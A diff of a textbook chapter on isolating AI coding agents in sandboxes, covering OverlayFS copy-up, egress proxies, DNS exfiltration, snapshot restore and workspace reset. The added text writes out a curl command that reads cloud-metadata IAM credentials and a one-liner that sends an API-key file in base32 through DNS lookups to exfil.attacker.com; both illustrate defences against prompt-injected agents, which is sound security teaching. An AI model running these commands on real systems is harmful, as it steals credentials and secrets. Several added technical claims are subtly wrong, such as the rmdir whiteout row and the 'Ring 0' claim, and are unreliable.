+| **Merged View**      | `merged` mount point | Read-Write            | Synthetic VFS Union           | Presents a unified filesystem tree to the sandboxed agent. Mediates path traversal lazily between upper and lower layers.            |
+| **Upper Scratchpad** | `upperdir`           | Read-Write            | Ephemeral Host Storage        | Captures all new files, modified files copied up via `ovl_copy_up`, directory structures, and `0/0` character device whiteouts.      |
+| **Staging Workdir**  | `workdir`            | Read-Write (Internal) | Same Filesystem as `upperdir` | Used by the kernel to stage intermediate file writes and atomic renames, preventing torn writes from corrupting the workspace.       |
+| **Lower Baseline**   | `lowerdir`           | Read-Only             | Immutable Golden Image        | Shared base filesystem containing pristine source code, compilers, and toolchains. Shared read-only across all concurrent sandboxes. |
+
+: **OverlayFS Layer Hierarchy and Inode Virtualization Roles**: Directory roles, access privileges, and kernel mediation dynamics in copy-on-write workspace virtualization. {#tbl-vol3-overlayfs-layers}
+
+When an agent executes `open(path, O_RDONLY)`, the VFS resolves the path through `upperdir` first; if absent, it falls back to `lowerdir`, providing read access at native filesystem speeds without copying. However, when an agent opens an existing lower-layer file with write intent (`O_WRONLY` or `O_RDWR`), OverlayFS initiates a synchronous *copy-up* operation: the kernel allocates a new inode in `upperdir`, copies the entire file contents from `lowerdir` into `upperdir`, copies extended attributes, and redirects the file descriptor to the newly created replica, governing the POSIX operations summarized in @tbl-vol3-overlayfs-operations.
+
+| POSIX Operation              | State in `lowerdir` | Initial State in `upperdir` | Action Taken by Kernel                                   | Visible State in `merged`     |
+|:-----------------------------|:--------------------|:----------------------------|:---------------------------------------------------------|:------------------------------|
+| **Read File** (`O_RDONLY`)   | Exists              | Absent                      | Reads lower inode directly; zero copy                    | File contents from `lowerdir` |
+| **Modify File** (`O_RDWR`)   | Exists              | Absent                      | Triggers `ovl_copy_up`; copies entire file to `upperdir` | Mutable file in `upperdir`    |
+| **Create File** (`O_CREAT`)  | Absent              | Absent                      | Allocates new inode directly in `upperdir`               | Newly created upper file      |
+| **Delete File** (`unlink`)   | Exists              | Absent                      | Creates `0/0` character device whiteout in `upperdir`    | File absent (`-ENOENT`)       |
+| **Delete File** (`unlink`)   | Exists              | Exists (Copied up)          | Unlinks upper file; replaces with `0/0` whiteout         | File absent (`-ENOENT`)       |
+| **Wipe Directory** (`rmdir`) | Directory Exists    | Absent                      | Creates directory in `upperdir` with opaque xattr        | Empty directory (`.`, `..`)   |
+
+: **OverlayFS POSIX Operations and Inode Lifecycle Dynamics**: Kernel-level resolution and copy-up behavior across lower and upper layers during agent execution. {#tbl-vol3-overlayfs-operations}
+
+To handle deletions without mutating the immutable baseline, OverlayFS creates special *whiteout markers*. When an agent runs `rm tests/test_cases.py`, the kernel creates a character device in `upperdir` with major/minor device numbers set to zero:
+
+$$\text{dev\_t} = \text{makedev}(0, 0)$$
+
+Subsequent path lookups encountering the `0/0` character device mask the lower file and return `-ENOENT`.
+
+#### The copy-up write amplification trap
+
+The copy-up mechanism introduces a subtle but severe performance pitfall: write amplification on large fixtures. If a coding agent appends a single byte to a 5 GB SQLite database, machine learning model weight file, or binary test fixture residing in `lowerdir`, OverlayFS must copy all 5 GB to `upperdir` before executing the 1-byte append:
+
+```bash
+# Triggering a 5 GB copy-up by appending a timestamp to a test fixture
+echo "TEST_EPOCH=1719200000" >> tests/fixtures/test_suite.bin
+```
+
+This copy-up locks the file's dentry, exhausts storage bandwidth, and can stall agent execution for tens of seconds. Systems designers mitigate this by decomposing large fixtures into chunked assets or mounting large read-only fixtures on dedicated read-only loopback devices bypassing the overlay.
+
+#### Scratchpad storage quota enforcement
+
+To prevent denial-of-service via disk exhaustion (such as an unconstrained model generating infinite output loops), runtimes enforce strict storage quotas on `upperdir` using XFS project quotas or backing `upperdir` with a size-bounded `tmpfs`:
+
+```bash
+# Assigning a 2 GB storage quota to an agent's upper scratchpad directory
+xfs_quota -x -c 'project -s -p /sandboxes/agent_42/upper 42' /sandboxes
+xfs_quota -x -c 'limit -p bsoft=2g bhard=2g 42' /sandboxes
+```
+
 ### Workspace leases per trajectory, reset per tenant {#sec-vol3-sandboxes-lease}
 
 The workspace's lifetime follows from the horizon exposure. The runtime binds the workspace, the envelope, the egress identity, and the brokered credentials into one *workspace lease* scoped to the trajectory. Unlike the in-flight lease of @sec-vol3-tool-calling-idempotency, which guards one call against duplicate execution, a workspace lease owns an environment for a whole trajectory. Everything in the lease persists across turns, because a multi-turn agent needs its earlier edits and its warmed build cache, and everything ends when the trajectory ends. The lease carries a hard expiry so that an abandoned trajectory cannot hold a sandbox indefinitely, and the trajectory record that holds it belongs to the harness (@sec-vol3-controlplane-acb). When the lease ends, the runtime exports the upper layer as a diff for evaluation or approval and then discards it. Nothing in a workspace is ever handed to another trajectory or tenant. What must survive a crash of the harness itself, rather than the normal end of a lease, is the subject of @sec-vol3-durable-execution.
@@ -386,35 +633,44 @@ The proxy can enforce its allowlist at two depths, compared in @tbl-vol3-egress-
 
 The distinction matters because an allowed host is still a channel. A trajectory permitted to reach a public code-hosting site can post a secret into a public gist as easily as it can clone a repository. Brokering narrows that channel further, because the proxy attaches credentials only for the methods and resources the capability covers. It can allow reads from a package registry and allow pushes only to the trajectory's own branch, and an unauthenticated upload to an arbitrary gist then fails at the far end.
 
-### Covert DNS channels
+### The default-deny primitive and SSRF containment
 
-Name resolution is the channel that most often survives a well-built proxy. If the sandbox's resolver forwards queries to public recursive resolvers, a script can encode a secret into subdomain labels, `c2VjcmV0.tunnel.example.org`, and the attacker's authoritative name server receives every label as it resolves. No TCP connection to the attacker ever opens. The fix is a split-horizon resolver that the runtime owns. The sandbox's resolver points only at it. It answers only names on the allowlist and returns a nonexistent-domain response for everything else, and for allowlisted zones that accept arbitrary subdomains it caps label length, rate-limits queries per sandbox, and drops labels whose character entropy approaches that of random encoded data.
+By default, an agent sandbox network interface must drop all outbound packets. The most critical threat vector mitigated by default-deny filtering is Server-Side Request Forgery (SSRF) targeting cloud metadata services. Cloud virtual machines expose instance metadata and temporary IAM credentials at the link-local IPv4 address `169.254.169.254` (or `[fd00:ec2::254]` in IPv6). If an agent possesses unconstrained network access, a prompt-injected script can query the instance metadata endpoint and exfiltrate host supervisor credentials:
 
-::: {#nbk-08-dns-exfiltration-bandwidth-vs-monitored .callout-notebook title="DNS exfiltration under a monitored resolver"}
+```bash
+$ curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/HostRole
+```
 
-**Problem**: A compromised dependency inside a coding sandbox tries to exfiltrate a 64 KB private key through DNS lookups. How long does the transfer take through an unrestricted resolver, and how long through a resolver that clamps labels and query rate?
+Host packet filters (using `nftables` or `iptables`) must unconditionally drop all traffic destined for `169.254.169.254` as well as RFC 1918 private IPv4 subnets (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), preventing lateral movement into internal cluster infrastructure.
 
-**Variables**:
+### Transparent forward proxying and credential injection
 
-* Payload $M = 65{,}536$ bytes.
-* Unrestricted resolver: 55 raw bytes per query (88 base32 characters split across two labels within the 63-character label limit), 15 ms per query, 64 queries in flight.
-* Monitored resolver: labels capped at 24 characters, which carry 15 raw bytes at base32's 8/5 expansion, and 2 queries per second per sandbox.
+When an agent legitimately requires external network access (for instance, to download language packages from PyPI or query a GitHub repository), the sandbox routes HTTP/HTTPS traffic through a mediating forward proxy:
 
-**Math**:
+```bash
+export HTTP_PROXY="http://10.0.0.1:8080"
+export HTTPS_PROXY="http://10.0.0.1:8080"
+export NO_PROXY="localhost,127.0.0.1"
+```
 
-Unrestricted, the transfer takes $\lceil 65{,}536 / 55 \rceil = 1{,}192$ queries, and with 64 in flight
-$$T_{\text{open}} \approx \frac{1{,}192 \times 0.015\text{ s}}{64} \approx 0.28\text{ s},$$
-an effective bandwidth of about 234 KB/s.
+The host proxy daemon validates destinations against an explicit domain allowlist. Furthermore, the proxy enables *credential injection*: rather than placing sensitive API tokens (such as a GitHub personal access token) inside the sandbox filesystem or environment variables, the proxy intercepts outbound requests and injects the `Authorization: Bearer <token>` header in host user space. The sandboxed code never possesses the secret it uses.
 
-Monitored, it takes $\lceil 65{,}536 / 15 \rceil = 4{,}370$ queries at 2 per second:
-$$T_{\text{clamped}} = \frac{4{,}370}{2\text{ queries/s}} = 2{,}185\text{ s} \approx 36.4\text{ min},$$
-an effective bandwidth of 30 B/s.
+### Covert DNS channels and exfiltration mechanics
 
-**Systems insight**: Clamping cuts the channel's bandwidth by a factor of about 7,800 and turns a transfer that finishes before any human could notice into a half-hour of anomalous queries. The clamp does not close the channel. It buys the detection window in which the runtime revokes the lease.
+When HTTP and TCP egress are blocked, an adversary can leverage recursive DNS resolution as a covert exfiltration channel. Because standard operating system network stacks require UDP port 53 for host name resolution, an adversarial script can encode confidential files (such as environment variables or private keys) into base32 or hex strings and issue DNS lookup queries for subdomains of an attacker-controlled apex domain:
 
-:::
+```bash
+$ cat /workspace/api_keys.env | base32 | tr -d '\n' | fold -w 50 | \
+    while read chunk; do dig +short "${chunk}.exfil.attacker.com"; done
+```
 
-Egress control governs the bytes that leave through the network. In many agents, though, the channel out is not a socket the sandbox opens but a tool the agent was deliberately given.
+The recursive DNS resolver forwards the query across the public internet to the authoritative nameserver for `attacker.com`, which logs the query payloads and reassembles the exfiltrated secret.
+
+To neutralize DNS exfiltration, the sandbox must prohibit arbitrary outbound UDP port 53 connections. All DNS traffic is forced through a dedicated local caching resolver that enforces:
+
+1. **FQDN Allowlisting**: Resolves only explicitly pre-approved domain names.
+2. **Split-Horizon Query Dropping**: Drops all queries for non-whitelisted apex domains before packet transmission.
+3. **Query Length and Entropy Caps**: Traps and alerts on queries exceeding 64 characters or exhibiting high Shannon entropy characteristic of encoded data.
 
 ## Tracking Untrusted Data {#sec-vol3-sandboxes-taint}
 
@@ -520,6 +776,25 @@ Two extremes bracket the design. A fresh envelope for every tool call gives the 
 
 Holding many fully booted guests idle would cost the full guest memory of each one. Snapshot restore avoids that. The runtime boots one golden guest to its ready state, with the kernel up, the interpreter started, and the task's dependencies loaded, and then saves its memory and device state. A new envelope maps the saved memory copy-on-write and fetches pages lazily as the guest touches them, so an idle envelope costs little more than page tables and monitor state. Pages that no guest writes, such as kernel text, shared libraries, and loaded bytecode, exist once in host memory for the whole pool, and only the pages a trajectory writes become private to it. In the illustrative coding-agent sandbox profile this chapter uses, acquiring an envelope from a warm pool takes `{python} SandboxPoolSizing.t_acquire_str` ms, restoring a fresh one from its snapshot takes `{python} SandboxPoolSizing.t_restore_str` ms, and a full guest image occupies `{python} SandboxPoolSizing.m_guest_str` GB.
 
+### Snapshot rehydration via userfaultfd on-demand paging
+
+Re-hydrating an instance from a memory snapshot avoids the entire kernel boot sequence. Rather than allocating fresh physical memory and copying gigabytes of state over the host memory bus, the supervisor initializes a new KVM virtual machine context and maps the serialized snapshot file using the Linux `mmap` system call with private, copy-on-write semantics:
+
+$$\text{HVA} = \text{mmap}\left(\text{NULL}, M_{\text{guest}}, \text{PROT\_READ} \mid \text{PROT\_WRITE}, \text{MAP\_PRIVATE}, \text{fd}_{\text{snapshot}}, 0\right)$$
+
+Under `MAP_PRIVATE`, the host operating system kernel does not copy physical memory pages into the new process address space during initialization. Instead, it creates page table entries referencing the read-only file cache pages of the golden template snapshot. Multiple concurrent sandboxes share the exact same underlying physical RAM pages for all read-only operations, including kernel text, shared libraries, and Python bytecode.
+
+For distributed or network-backed snapshots, Linux's `userfaultfd` (UFFD) mechanism enables lazy, demand-driven page loading. When the guest vCPU attempts to execute code or read memory on an unmapped guest physical page, an EPT violation traps to the host kernel. The host kernel suspends the vCPU thread and dispatches a page-fault notification over the `userfaultfd` file descriptor to a user-space page provider daemon. The daemon fetches the 4 KB page over the network or local NVMe storage, registers it with `ioctl(uffd, UFFDIO_COPY)`, and resumes vCPU execution, following the lifecycle mapped in @tbl-vol3-uffd-states.
+
+| Page Classification          | Memory Residency                  | Host Page Table Entry (PTE)     | Guest Access Trigger                     | Kernel Resolution & Copy Dynamics                                                 |
+|:-----------------------------|:----------------------------------|:--------------------------------|:-----------------------------------------|:----------------------------------------------------------------------------------|
+| **Unaccessed Snapshot Page** | Backing NVMe image file           | `PTE_PRESENT = 0` (Unmapped)    | Guest instruction fetch or read          | Host MMU traps; delivers missing page message over `userfaultfd` descriptor.      |
+| **In-Flight Paging Request** | Host supervisor memory buffer     | Suspended vCPU thread           | Asynchronous page fetch                  | Supervisor calls `ioctl(uffd, UFFDIO_COPY, ...)` to populate host physical frame. |
+| **Shared Read-Only Page**    | Host page cache (Golden template) | `PTE_PRESENT = 1`, `PROT_READ`  | Subsequent guest read accesses           | Direct reads from host DRAM without duplication; shared across $N$ microVMs.      |
+| **Dirty Private CoW Page**   | Private host DRAM frame           | `PTE_PRESENT = 1`, `PROT_WRITE` | Guest write intent (`store`, stack/heap) | Host MMU write fault; transparently duplicates 4 KiB frame into private DRAM.     |
+
+: **userfaultfd On-Demand Page Lifecycle and State Transitions**: Memory states, fault interception, and copy-on-write page duplication dynamics during microVM execution. {#tbl-vol3-uffd-states}
+
 ### The reset contract {#sec-vol3-sandboxes-pooling-reset}
 
 When a lease ends, a tempting shortcut is to clean the envelope in place by killing the agent's processes, deleting temporary files, and returning it to standby. The shortcut fails because a general-purpose guest hides state in far more places than a cleanup script checks. A daemon that double-forked into shared memory survives the process kill. An abstract socket stays bound without any file on disk. A token stays in the kernel keyring, a cron entry waits for the next tenant, and an attacker-modified `git` or `pytest` sits on the search path. The next tenant's trajectory inherits all of it, which turns one injection into a cross-tenant compromise.
@@ -530,6 +805,33 @@ Proving an environment clean requires inspecting every place state can hide. Pro
 :::
 
 Containment beneath the model (principle \ref{pri-vol3-zero-trust-sandboxing}) extends to reset. The runtime returns an envelope to service in one of two ways, both driven from outside the guest and neither dependent on finding what the tenant left behind. It can destroy the envelope and restore a replacement from the snapshot, or it can roll the existing envelope back by discarding the upper layer, dropping every private memory page so that reads fall through to the snapshot again, and resetting the virtual CPU state. Either way, the envelope that returns to standby matches the golden snapshot by construction rather than by inspection.
+
+| Reset Dimension                        | OverlayFS Directory Reclamation                                      | Block-Level Snapshotting (`dm-thin` / Btrfs)      | Pre-Warmed MicroVM Rollback (`madvise`)                 |
+|:---------------------------------------|:---------------------------------------------------------------------|:--------------------------------------------------|:--------------------------------------------------------|
+| **Teardown Primitive**                 | `umount` + asynchronous directory unlink (`rm -rf`)                  | Snapshot de-allocation + thin device discard      | `madvise(MADV_DONTNEED)` + vCPU register reset          |
+| **Algorithmic Complexity**             | $\mathcal{O}(k_{\text{inodes}})$ directory tree traversal            | $\mathcal{O}(1)$ B-tree leaf pointer release      | $\mathcal{O}(1)$ VMA page table zeroing                 |
+| **Reset Latency ($T_{\text{reset}}$)** | $1\text{--}5\text{ ms}$ (Async) / $200\text{--}800\text{ ms}$ (Sync) | $< 5\text{ ms}$                                   | **$< 2\text{ ms}$**                                     |
+| **Page Cache Sharing**                 | Unified host page cache across all sandboxes                         | Deduplicated only within common block tree        | Shared template page cache; private CoW dirty pages     |
+| **Host Write Amplification**           | Proportional to modified file sizes                                  | Block-level granularity (typically 64 KiB chunks) | Page-level granularity (4 KiB or 2 MiB huge pages)      |
+| **Failure Mode**                       | Inode exhaustion or lock contention on host XFS                      | Block pool allocation exhaustion under leak       | Kernel lockup if dirty page flushing stalls host memory |
+
+: **Workspace Reset Architectures: Union Filesystem Teardown versus Block-Level Thin Provisioning**: Performance characteristics, algorithmic complexities, and operational failure modes. {#tbl-vol3-reset-architectures}
+
+As compared in @tbl-vol3-reset-architectures, tearing down ephemeral scratchpads delivers deterministic clean states without in-place residual leakage.
+
+### Cross-tenant contamination failure trace
+
+In-place workspace scrubbing—attempting to clean up an existing container or process environment by deleting modified files and killing known PIDs—invariably leaks state across tenant boundaries. @Lst-vol3-cross-tenant-trace illustrates a production failure trace where in-place scrubbing allowed background daemons, abstract UNIX domain sockets, and kernel keyring entries to persist:
+
+::: {#lst-vol3-cross-tenant-trace lst-cap="**Failure Trace: Cross-Tenant Contamination via Incomplete In-Place Scrubbing**: Detection of persistent background daemons, abstract socket bindings, and leaked kernel keyring secrets following an in-place environment cleanup attempt."}
+```bash
+# Failure trace: Cross-tenant contamination via incomplete in-place scrubbing
+[2026-09-19T11:02:14.102Z] AUDIT host_scrubber: Workspace scrubbed; scanning for lingering state...
+[2026-09-19T11:02:14.105Z] INVARIANT VIOLATION: Daemon survived via double-fork into root namespace (PID 14209)
+[2026-09-19T11:02:14.106Z] INVARIANT VIOLATION: Abstract unix domain socket remains bound (@agent-backdoor)
+[2026-09-19T11:02:14.108Z] INVARIANT VIOLATION: Leaked credential in Linux kernel keyring (key_id=0x38fa21b)
+```
+:::
 
 ### Pool dimensioning under bursty traffic {#sec-vol3-sandboxes-pooling-queueing}
 
@@ -576,36 +878,26 @@ The mechanisms of this chapter are individually simple, and most failures in pra
 
 ## Fallacies and Pitfalls {#sec-vol3-sandboxes-fallacies}
 
-Sandboxing errors persist because each shortcut works in testing, where no one has planted an instruction and no tenant follows another. They surface only under adversarial content or at fleet scale.
+Sandboxing errors persist because each shortcut works in testing, where no one has planted an instruction or triggered an edge case.
 
 ::: {.fallacy-pitfall}
-**Fallacy:** *System prompt instructions such as "never run destructive commands" provide isolation.*
-
-A system prompt is more text in the same sequence the attacker writes into. Planted instructions compete with it on equal terms, and injection benchmarks [@zhan2024injecagent; @debenedetti2024agentdojo] measure how often they win as a rate, not as a yes-or-no property. Sampling adds a second failure path with no attacker, since a benign task still yields an occasional destructive proposal. Instructions and safety training lower both rates. The invariant closure principle (\ref{pri-invariant-closure}) says what they cannot do, which is bound the outcome. The runtime supplies that bound by making the destructive command harmless where it runs, whatever the model was told.
+**Fallacy: Language-level AST validation and restricted globals can sandbox interpreted runtimes.**
+*Pitfall:* High-level dynamic languages (Python, Ruby, Node.js) treat scopes, classes, and methods as mutable objects in a unified heap. Removing builtins breaks only symbolic variable references. Any literal tuple, string, or integer retains bidirectional pointers linking back to the universal base class `object`, whose `__subclasses__()` method exposes every class loaded in memory. Furthermore, static AST analysis cannot resolve dynamic string concatenation, hex decoding, or `getattr()` calls (undecidable by Rice's theorem). A single native extension (NumPy, Pillow) vulnerability completely collapses user space into Ring 0 host compromise.
 :::
 
 ::: {.fallacy-pitfall}
-**Pitfall:** *Running model-written code in shared-kernel containers with default settings.*
-
-A container is a host process with a filtered view, and every system call it makes lands in the host kernel. Default profiles leave hundreds of system calls reachable, pseudo-filesystems under `/proc` and `/sys` expose details of the host kernel, and a mounted container-runtime socket or an added administrative capability is a direct path to the host. An agent that compiles and runs arbitrary native code is exercising that interface at machine speed, so a single kernel privilege-escalation bug becomes a host compromise and a cross-tenant one. Model-written native code belongs behind its own guest kernel (@sec-vol3-sandboxes-microvms), and containers belong to code the operator trusts.
+**Fallacy: Operating system containers (Docker/runC) provide multi-tenant isolation boundaries.**
+*Pitfall:* Containers isolate namespaces (`PID`, `NET`, `MNT`) within a single monolithic Linux kernel. Every system call from a container transitions directly to host Ring 0. A single kernel vulnerability in any of the 450+ host syscalls, eBPF subsystems, or `io_uring` drivers grants arbitrary root execution across all co-located sandboxes.
 :::
 
 ::: {.fallacy-pitfall}
-**Fallacy:** *Read-only tools cannot cause security damage.*
-
-Read authority is exfiltration authority whenever any outbound channel exists. A read-only agent that can open `~/.aws/credentials`, a service-account token file, or a customer table has everything an attacker wants, and it can send it through a fetch tool's URL, a DNS lookup, an issue comment, or the arguments of any tool that reaches an external system. In a cloud sandbox a plain HTTP read of the metadata endpoint returns the host's credentials. The authority levels place $A_0$ lowest because it mutates nothing, not because it exposes nothing. Read access therefore needs scoped capabilities, secret-free sandboxes, default-deny egress, and taint checks on outbound arguments like any other level.
+**Fallacy: In-place filesystem and process scrubbing is faster and just as secure as tearing down copy-on-write overlays.**
+*Pitfall:* In-place scrubbing invariably suffers from cross-tenant contamination. Double-forked background processes escaping to PID 1, abstract UNIX domain sockets, bound network ports, and Linux kernel keyring credentials persist across scrub passes. Reliable multi-tenant security demands unmounting and destroying ephemeral OverlayFS scratchpads and recycling or re-hydrating microVMs from clean snapshots.
 :::
 
 ::: {.fallacy-pitfall}
-**Pitfall:** *Placing API keys in the sandbox environment because the sandbox is isolated.*
-
-Isolation protects the host from the sandbox. It does nothing to protect secrets placed inside the sandbox from the code running there, and that code includes whatever an injected instruction asks the model to write. An environment variable is one `env` command from any process in the envelope. Credentials belong at the egress proxy, attached per request against the trajectory's capability and minted to expire with the lease (@sec-vol3-sandboxes-credential-brokering), so that everything inside the sandbox can be read by an attacker without loss.
-:::
-
-::: {.fallacy-pitfall}
-**Pitfall:** *Cleaning a sandbox in place and handing it to the next tenant.*
-
-A cleanup script removes the state its author thought of. Background processes that escaped into shared memory, abstract sockets, keyring entries, cron jobs, and modified binaries on the search path survive it, and the next tenant's agent inherits them, including anything an earlier injection planted to intercept later work. A pool is safe only under the reset contract of @sec-vol3-sandboxes-pooling-reset. Every envelope returns to standby by rollback to its snapshot or is destroyed, and no envelope is ever trusted because a script reported it clean.
+**Fallacy: Network firewalls blocking outbound TCP/UDP traffic are sufficient to prevent data exfiltration.**
+*Pitfall:* If the sandbox retains access to a standard recursive DNS resolver on UDP port 53, an adversarial script can exfiltrate sensitive files by encoding data into subdomain labels (`base32(secret).attacker.com`). Containment requires split-horizon DNS filtering with strict FQDN allowlisting, query length caps, and dropping all unauthorized apex queries.
 :::
 
 ## Summary {#sec-vol3-sandboxes-summary}
